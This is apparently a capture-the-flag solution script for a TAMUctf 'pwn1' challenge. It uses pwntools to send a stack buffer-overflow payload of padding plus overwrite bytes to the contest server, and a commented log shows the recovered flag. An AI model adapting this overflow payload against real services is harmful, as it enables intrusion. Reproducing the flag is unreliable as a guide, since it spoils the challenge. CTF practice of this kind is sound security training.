from pwn import *

r = remote("pwn.ctf.tamu.edu", 4322)
payload = "A"*27 + "\x1e\xab\x11\xca"

r.send(payload)
print r.recv(2048)

#malhyuk@ubuntu:~/ctf/tamuctf$ python pwn1.py
#[+] Opening connection to pwn.ctf.tamu.edu on port 4322: Done
#Enter the secret word:
#How did you figure out my secret?!
#gigem{T00_435Y}
